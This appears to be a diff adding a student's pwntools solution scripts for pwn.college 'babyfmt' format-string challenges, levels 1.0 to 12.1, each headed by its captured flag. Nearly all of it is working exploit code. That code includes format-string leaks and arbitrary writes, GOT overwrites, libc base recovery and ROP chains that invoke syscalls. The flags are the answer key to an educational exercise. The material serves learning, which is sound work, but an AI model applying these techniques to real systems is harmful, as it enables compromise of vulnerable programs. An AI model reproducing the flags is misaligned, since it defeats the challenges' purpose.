@@ -1,0 +1,597 @@
+1.0. pwn.college{0bOTZTpdtUamVByaz6KPyRMidmo.0lNxQzMsITNxUzW}
+def challenge1():
+    fmt_string = b'leak: %16$s'
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.send(fmt_string)
+        info(p.readuntil(b'leak: '))
+        password = p.readline().strip()
+        info(p.clean())
+        p.send(password)
+        info(p.clean())
+
+1.1. pwn.college{Yga9clJEcQg7dR-tt8SXiWu_cek.01NxQzMsITNxUzW}
+changes...
+    fmt_string = b'leak: %18$s'
+
+2.0. pwn.college{MSmhAdfc_Qmw3kosaSPNfIGGW2a.0FOxQzMsITNxUzW}
+def challenge2():
+    fmt_string = b'leak: %22$p %23$p'
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.send(fmt_string)
+        info(p.readuntil(b'leak: '))
+
+        password = p.readline().strip().decode()
+        password = password[21:] + password[2:18]
+        password = [chr(int(password[i] + password[i+1], 16)) for i in range(0, len(password)-1, 2)]
+        password = ''.join(password)[::-1]
+
+        info(p.clean())
+        info(password)
+        p.send(password)
+        info(p.clean())
+
+2.1. pwn.college{EzgLIRRTfWEKqUwIcbsi4TPO9Rv.0VOxQzMsITNxUzW}
+changes...
+    fmt_string = b'leak: %12$p %13$p'
+
+3.0. pwn.college{0TmUVs6kl7aB-BqPWtnU01hT5wD.0FMyQzMsITNxUzW}
+def challenge3():
+    fmt_string = b'flag: %22$s' + p64(0x404100)
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(fmt_string)
+        info(p.clean())
+
+3.1. pwn.college{kQGFtWiVyYfp3_AiE9vjebalLaw.0VMyQzMsITNxUzW}
+changes...
+    fmt_string = b'   flag: %32$s' + p64(0x404110)
+
+4.0. pwn.college{8XrDZu3VTcFpMy609LBVyOuFfZd.0lMyQzMsITNxUzW}
+def challenge4():
+    fmt_string = b'%161x%22$n      ' + p64(0x404170)
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(fmt_string)
+        info(p.clean())
+        
+4.1. pwn.college{ANpPus03RYGndDcGwlZCr6CsgiC.01MyQzMsITNxUzW}
+changes...
+    fmt_string = b'%128x%26$n' + p64(0x404148)
+
+5.0. pwn.college{0xRWuvz7brZdenDjTtIpKQ87anB.0FNyQzMsITNxUzW}
+def challenge5():
+    bss_addr = 0x404120
+    fmt_string = (b'%133x%44$hn%181x%45$hn%108x%46$hn%17x%47$hn%6x%48$hn%231x%49$hn%134x%50$hn%243x%51$hn      ' 
+        + p64(bss_addr)
+        + p64(bss_addr + 1)
+        + p64(bss_addr + 2)
+        + p64(bss_addr + 3)
+        + p64(bss_addr + 4)
+        + p64(bss_addr + 5)
+        + p64(bss_addr + 6)
+        + p64(bss_addr + 7))
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(fmt_string)
+        info(p.clean())
+        
+5.1. pwn.college{QxlwhfE3j_LG_Kt5qeIw-m0hnqj.0VNyQzMsITNxUzW}
+changes.... 
+    bss_addr = 0x404108
+    fmt_string = (b'%82x%40$hn%129x%41$hn%169x%42$hn%221x%43$hn%84x%44$hn%85x%45$hn%155x%46$hn%192x%47$hn  ' 
+        + p64(bss_addr)
+        + p64(bss_addr + 1)
+        + p64(bss_addr + 2)
+        + p64(bss_addr + 3)
+        + p64(bss_addr + 4)
+        + p64(bss_addr + 5)
+        + p64(bss_addr + 6)
+        + p64(bss_addr + 7))
+
+6.0. pwn.college{YeKEMcSrxn2VzmFGYgwetxXgNRp.0lNyQzMsITNxUzW}
+bss_addr = 0x404180
+    fmt_string = (b'%*63$x%29$n ' + p64(bss_addr))
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(fmt_string)
+        info(p.clean())
+
+6.1. pwn.college{M-EkAg4y5E8tJ-OApnmB_8BoLAw.01NyQzMsITNxUzW}
+changes...
+    bss_addr = 0x404130
+    fmt_string = (b'%*65$x%24$n' + p64(bss_addr))
+
+7.0. pwn.college{sam0qe3zFx1pCqFSVNZaoCWWEbq.0FOyQzMsITNxUzW}
+def challenge7():
+    win = 0x401540
+    fmt_string1 = (b'%7$lx')
+    fmt_string2 = (b'%*13$x%12$n     ')
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(fmt_string1)
+        info(p.readuntil(b'Show me what you got :P\n'))
+        ret_addr = int(p.readline().strip().decode(), 16)
+        payload = fmt_string2 + p64(ret_addr + 1048) + p64(win)
+        p.sendline(payload)
+        info(p.clean())
+        p.sendline(b'END')
+        info(p.clean())
+
+7.1. pwn.college{8xn5UXGY18zCGxfVKeGfwjOnpLJ.0VOyQzMsITNxUzW}
+changes...
+    win = 0x40133d
+    fmt_string1 = (b'%7$lx')
+    fmt_string2 = (b'%*47$x%46$n     ')
+
+
+8.0. pwn.college{MYhSGXVCthkf9kT0nwuXxK6vvUL.0FMzQzMsITNxUzW}
+def challenge8():
+    ret_offset = 1025
+    fmt_string1 = (b'%7$lx')
+    fmt_string2 = (b'%161$lx')
+    fmt_string3 = (b'%1340x%35$hn     ')
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.clean())
+        p.sendline(fmt_string1)
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        ret_addr_ptr = int(p.readline().strip().decode(), 16)
+        payload = fmt_string2
+        p.sendline(fmt_string2)
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        ret_addr = int(p.readline().strip().decode(), 16)
+        info(p.clean())
+        payload = fmt_string3 + p64(ret_addr_ptr + ret_offset) + p64(ret_addr - 0x8f2 + 0x553) 
+        p.sendline(payload)
+        info(p.clean())
+        p.sendline(b'END')
+        info(p.clean())
+
+
+8.1. pwn.college{IcqY_54qILFakSlPEOvvDLK1aS7.0VMzQzMsITNxUzW}
+changes...
+    ret_offset = 1018
+    fmt_string1 = (b'%7$lx')
+    fmt_string2 = (b'%157$lx')
+    fmt_string3 = (b'%802x%32$hn       ')
+
+9.0. pwn.college{od_AAQlAoMqXyJZLYjV0Ho-OUqQ.0lMzQzMsITNxUzW}
+def exec_func_challenge9(payload):
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        p.readuntil(b'Have fun!\n')
+        p.sendline(payload)
+        p.readuntil(b'Your input is:             \n')
+        result = p.readall()
+        info(result)
+        return result
+
+def challenge9():
+    win = 0x20f5e1
+    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}")
+    fmt = FmtStr(exec_func_challenge9)
+    padding = b'a' * fmt.padlen
+    payload = fmtstr_payload(fmt.offset,{binary.got.exit:p64(win)})
+
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.readuntil(b'Have fun!\n'))
+        p.sendline(payload)
+        info(p.clean())
+        p.poll(block=True)
+
+
+9.1. pwn.college{wA5_PE5oXI8gLIzYubdN2bviuJN.01MzQzMsITNxUzW}
+changes...
+    p.readuntil(b'Your input is:                                \n')
+    win = 0x10e2cd
+
+
+10.0. pwn.college{kirrlXPKIXIA6C9qJ7P7pI6P4qO.0FNzQzMsITNxUzW}
+def exec_func_challenge10(payload):
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        p.readuntil(b'then exit.\n')
+        p.sendline(payload)
+        p.readuntil(b'Your input is:')
+        p.readline()
+        result = p.readall()
+        info(result)
+        return result
+
+def fix_addr(ret):
+    stack_arr = [hex(ret)[i:i+2] for i in range(2, len(hex(ret))-1, 2)]
+    ret_arr = [hex(int(x, 16)+0x70)[-2::] for x in stack_arr]
+    print(ret_arr)
+    stack_str = ""
+    for i in range(len(ret_arr)):
+        stack_str += ret_arr[i]
+    ret = int(stack_str, 16)
+    return ret
+
+def challenge10():
+    func = 0xb08430 # = 0x4014c0 
+    pop_sled = 0xb08846 # = 4018d6
+    libc_start_offset = 0x120f0 # how far the leaked addr is from _start
+    correct_stack_offset = 'a0' # leaked addr changes, this is the correct one
+    base = 0xdfe # how far the pop sled ret is from the leaked stack addr
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}")
+    fmt = FmtStr(exec_func_challenge10)
+    padding = b'a' * fmt.padlen
+    # this makes the exit call just call func again
+    payload = padding + fmtstr_payload(fmt.offset,{binary.got.exit:p64(func)})
+
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        # make program run in infinite loop
+        info(p.readuntil(b'Have fun!\n'))
+        p.sendline(payload)
+        info(p.clean())
+        # get the address of __libc_start_main
+        p.sendline(b'%10$lx')
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        read_addr = p.readline().strip().decode()
+        info(read_addr)
+        if read_addr[-2::] != correct_stack_offset:
+            return    
+            
+        random_addr = int(read_addr, 16) + libc_start_offset
+
+        print(f'libc_start = {hex(random_addr)}')
+        libc.address = random_addr - libc.symbols['__libc_start_main']
+        # make some rop gadgets
+        rop = ROP(libc)
+        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
+        syscall = rop.find_gadget(['syscall', 'ret']).address
+        trash_string = next(libc.search(b'libc_intl_domainname'))
+        info(p.clean())
+        # leak stack address
+        p.sendline(b'%7$lx')
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        stack_addr = (int(p.readline().strip().decode(), 16))
+   
+        info(p.clean())
+
+        # call pop sled which leads to the rop chain
+        rop_chain = (padding + 
+            fmtstr_payload(fmt.offset,{stack_addr-base:p64(fix_addr(pop_rax)), 
+                stack_addr-(base-8):p64(0x0070ca),
+                stack_addr-(base-16):p64(fix_addr(pop_rdi)),
+                stack_addr-(base-24):p64(fix_addr(trash_string)),
+                stack_addr-(base-32):p64(fix_addr(pop_rsi)),
+                stack_addr-(base-40):p64(0x95d), # 0x9ed
+                stack_addr-(base-48):p64(fix_addr(syscall))
+
+                })
+            )
+        p.sendline(rop_chain)
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        info(p.readline())
+        info(p.clean())
+        payload_pop_sled = padding + fmtstr_payload(fmt.offset,{binary.got.exit:p64(pop_sled)})
+        p.sendline(payload_pop_sled)
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        info(p.readline())
+
+
+
+10.1. pwn.college{Qec60vInqqxotQowBA6OzaYmcrX.0VNzQzMsITNxUzW}
+...figured out how to do it the right way
+...use the sae exec_func as level10.0
+def challenge10():
+    func = 0x4012bd
+    pop_sled = 0x401606
+    base = 0xab5 # how far the pop sled ret is from the leaked stack addr
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}")
+    fmt = FmtStr(exec_func_challenge10)
+    padding = b'a' * fmt.padlen
+    # this makes the exit call just call func again
+    payload = padding + fmtstr_payload(fmt.offset, {binary.got.exit:func}, numbwritten=120, write_size='byte')
+    
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.readuntil(b'Have fun!\n'))
+        p.sendline(payload)
+        info(p.clean())
+        # get the address of __libc_start_main
+        p.sendline(b'%327$lx')
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        libc_start_main_addr = int(p.readlineb().strip().decode(), 16) - 243
+        info(f'libc_start = {hex(libc_start_main_addr)}')
+        libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
+        # make some rop gadgets
+        rop = ROP(libc)
+        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
+        syscall = rop.find_gadget(['syscall', 'ret']).address
+        trash_string = next(libc.search(b'libc_intl_domainname'))
+        info(p.clean())
+        # leak stack address
+        p.sendline(b'%7$lx')
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        stack_addr = (int(p.readline().strip().decode(), 16))
+        info(p.clean())
+        # call pop sled which leads to the rop chain
+        rop_chain = (padding + 
+            fmtstr_payload(fmt.offset,{stack_addr-base:pop_rax,
+                stack_addr-(base-8):0x5a, # 0x5a
+                stack_addr-(base-16):pop_rdi,
+                stack_addr-(base-24):trash_string,
+                stack_addr-(base-32):pop_rsi,
+                stack_addr-(base-40):0x9ed, # 0x9ed
+                stack_addr-(base-48):syscall
+                },numbwritten=120, write_size='byte')
+            )
+        p.sendline(rop_chain)
+        info(p.readuntil(b'Your input is:'))
+        info(p.clean())
+        payload_pop_sled = padding + fmtstr_payload(fmt.offset, {binary.got.exit:pop_sled}, numbwritten=120, write_size='byte')
+        p.sendline(payload_pop_sled)
+        info(p.readuntil(b'Your input is:'))
+        info(p.readline())
+        info(p.readline())
+
+
+11.0. pwn.college{gMNuNoEI4hztfA0KMtY4uwt6Jbk.0lNzQzMsITNxUzW}
+def exec_func_challenge11(payload):
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        p.sendline(b'%197$lx')
+        p.readuntil(b'and then exit.\n')
+        p.sendline(payload)
+        p.readuntil(b'Your input is:')
+        p.readline()
+        result = p.readall()
+        info(result)
+        return result
+
+def challenge11():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}")
+    fmt = FmtStr(exec_func_challenge11)
+    padding = b'a' * fmt.padlen
+
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        info(p.readuntil(b'Have fun!\n'))
+        p.sendline(b'rbp: %196$lx \nret: %197$lx \nlibc: %207$lx')
+
+        info(p.readuntil(b'rbp: '))
+        rbp = int(p.readlineb().strip().decode(), 16)
+        info(p.readuntil(b'ret: '))
+        main = int(p.readlineb().strip().decode(), 16) - 406
+        info(p.readuntil(b'libc: '))
+        libc_start = int(p.readlineb().strip().decode(), 16) - 243
+        overwrite = rbp - 1608
+
+        binary.address = main - binary.symbols['main']
+        libc.address = libc_start - libc.symbols['__libc_start_main']
+
+        rop = ROP(libc)
+        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
+        syscall = rop.find_gadget(['syscall', 'ret']).address
+        trash_string = next(libc.search(b'libc_intl_domainname'))
+        
+        print(hex(pop_rax))
+        print(hex(pop_rdi))
+        print(hex(pop_rsi))
+        print(hex(syscall))
+        print(hex(trash_string))
+
+        rop_chain = (padding + 
+            fmtstr_payload(fmt.offset, {overwrite:pop_rax,
+                overwrite+8:0x5a, # 0x5a
+                overwrite+16:pop_rdi,
+                overwrite+24:trash_string,
+                overwrite+32:pop_rsi,
+                overwrite+40:0x9ed, # 0x9ed
+                overwrite+48:syscall
+                },numbwritten=112, write_size='byte')
+            )
+        
+        p.sendline(rop_chain)
+        info(p.clean())
+
+11.1. pwn.college{QDQxyRsKSW-SzYJ0WgXczvO6_5x.01NzQzMsITNxUzW}
+changes...
+def exec_func_challenge11(payload):
+    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
+        p.sendline(b'aaaa')
+        p.readuntil(b'a\n')
+        p.sendline(payload)
+        p.readuntil(b'Your input is:')
+        p.readline()
+        result = p.readall()
+        info(result)
+        return result
+
+p.sendline(b'rbp: %168$lx \nret: %169$lx \nlibc: %179$lx')
+overwrite = rbp - 1384
+numbwritten=40
+
+
+12.0. pwn.college{scoa9A-n1jPVzRNkid-0Vz9CR73.0FOzQzMsITNxUzW}
+def fmt_payload(byt):
+    atoms = []
+    atom = b''
+    i = 0
+    while byt[i+7].to_bytes(1, 'big') != b'\x00':
+        # print(type(atom))
+        # print()
+        atom += byt[i].to_bytes(1, 'big')
+        if byt[i].to_bytes(1, 'big') == b'n':
+            atoms.append(atom)
+            atom = b''
+        i += 1
+
+    print(atoms)
+
+    addrs = []
+    for i in range(len(byt), 0, -8):
+        if b'\x00' not in byt[(i-8):(i)]: break 
+        addrs.append(byt[(i-8):(i)])
+
+    addrs.reverse()
+
+    the_dict = {}
+    first = False
+    shift = []
+    shift.append(first)
+    the_dict.update({atoms[0]: int.from_bytes(addrs[0], "little")})
+    print(f'{first} {({atoms[0]: hex(int.from_bytes(addrs[0], "little"))})}')
+    for i in range(1, len(addrs)):
+        first = False
+        if(atoms[i].count(b'%') == 1): first = True 
+        the_dict.update({atoms[i]: int.from_bytes(addrs[i], "little")})
+        shift.append(first)
+        print(f'{shift[i]} {({atoms[i]: hex(int.from_bytes(addrs[i], "little"))})}')
+        
+
+    print(len(addrs))
+    adds = b''
+    for i in range(len(addrs)):
+
+        if shift[i]:
+            print(f'this guys {hex(int.from_bytes(addrs[i], "little"))}')
+            adds += addrs[i]
+
+        else:
+            adds += p64(0xdeadbeef) + addrs[i]
+
+    stripped = [(atoms[i].decode().split('$', 1)[0][:-2]+atoms[i].decode().split('$', 1)[1]) for i in range(len(atoms))]
+    atoms = ''.join(stripped).encode()
+
+    fmt = atoms + adds
+    return atoms, adds
+    
+
+def challenge12():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}")
+
+    # with gdb.debug([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], '''
+    # disp/5i $rip
+    # disp/40gx $rsp
+    # b read@plt
+    # c
+    # finish
+    # ''') as p:
+
+    with process([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], close_fds=False) as p:
+        info(p.readuntil(b'Have fun!\n'))
+        p.sendline(b' %lx '*141 + b'rbp: ' + b' %lx\n' + b'ret: ' + b' %lx\n' + b' %lx '*9 + b'\nlibc: ' + b' %lx ')
+        info(p.readuntil(b'rbp: '))
+        rbp = int(p.readlineb().strip().decode(), 16)
+        info(p.readuntil(b'ret: '))
+        main = int(p.readlineb().strip().decode(), 16) - 406
+        info(p.readuntil(b'libc: '))
+        libc_start = int(p.readlineb().strip().decode(), 16) - 243
+
+
+        binary.address = main - binary.symbols['main']
+        libc.address = libc_start - libc.symbols['__libc_start_main']
+        rop = ROP(libc)
+        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
+        syscall = rop.find_gadget(['syscall', 'ret']).address
+        trash_string = next(libc.search(b'libc_intl_domainname'))
+
+        padding = b'a'
+        rop_chain = (padding +
+            b'a'
+        )
+
+        overwrite = rbp-72   
+
+        rop_chain = fmtstr_payload(10, {overwrite: pop_rax, 
+            overwrite+8: 0x5a,
+            overwrite+16:pop_rdi,
+            overwrite+24:trash_string,
+            overwrite+32:pop_rsi,
+            overwrite+40:0x9ed, # 0x9ed
+            overwrite+48:syscall
+        }, numbwritten=302, write_size='byte')
+
+        fmt, addrs = fmt_payload(rop_chain)
+
+        padding = b'a'*(255-len(fmt))
+        p.sendline(b'%x'*65 + fmt + padding + addrs)
+        info(p.readuntil(b'### Goodbye'))
+        info(p.clean())
+        p.poll(block=True)
+
+12.1. pwn.college{UYrJYxOf2NMJ7N7o460cnPZpz1Z.0VOzQzMsITNxUzW}
+def challenge12():
+    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
+    binary = ELF(f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}")
+
+    # with gdb.debug([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], '''
+    # disp/5i $rip
+    # disp/40gx $rsp
+    # b read@plt
+    # c
+    # finish
+    # ''') as p:
+
+    with process([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], close_fds=False) as p:
+        info(p.readuntil(b'Have fun!\n'))
+        p.sendline(b' %lx '*147 + b'rbp: ' + b' %lx\n' + b'ret: ' + b' %lx\n' + b' %lx '*9 + b'\nlibc: ' + b' %lx ')
+        info(p.readuntil(b'rbp: '))
+        rbp = int(p.readlineb().strip().decode(), 16)
+        info(p.readuntil(b'ret: '))
+        main = int(p.readlineb().strip().decode(), 16) - 360
+        info(p.readuntil(b'libc: '))
+        libc_start = int(p.readlineb().strip().decode(), 16) - 243
+
+        binary.address = main - binary.symbols['main']
+        libc.address = libc_start - libc.symbols['__libc_start_main']
+        rop = ROP(libc)
+        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
+        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
+        syscall = rop.find_gadget(['syscall', 'ret']).address
+        trash_string = next(libc.search(b'libc_intl_domainname'))
+
+        # this is the saved return address
+        overwrite = rbp-72   
+        rop_chain = fmtstr_payload(10, {overwrite: pop_rax, 
+            overwrite+8: 0x5a,
+            overwrite+16:pop_rdi,
+            overwrite+24:trash_string,
+            overwrite+32:pop_rsi,
+            overwrite+40:0x9ed, # 0x9ed
+            overwrite+48:syscall
+        }, numbwritten=304, write_size='byte')
+
+        # rop_chain = fmtstr_payload(10, {overwrite: 0xdeadbeef}, numbwritten=304, write_size='byte')
+
+        fmt, addrs = fmt_payload(rop_chain)
+
+        # fmt = fmt.replace(b"lln", b"llx")
+        # fmt = fmt.replace(b"hhn", b"llx")
+
+        addresses_offset = 240
+        num_prints = 71
+
+        # trying to print the 72 item
+
+        # 418 = len(fmt) + len(padding)
+
+        padding = b'a'*(addresses_offset-len(fmt))
+        p.sendline(b'%x'*num_prints + fmt + padding + addrs)
+        info(p.readuntil(b'### Goodbye'))
+        info(p.clean())
+        p.poll(block=True)
+
+
+
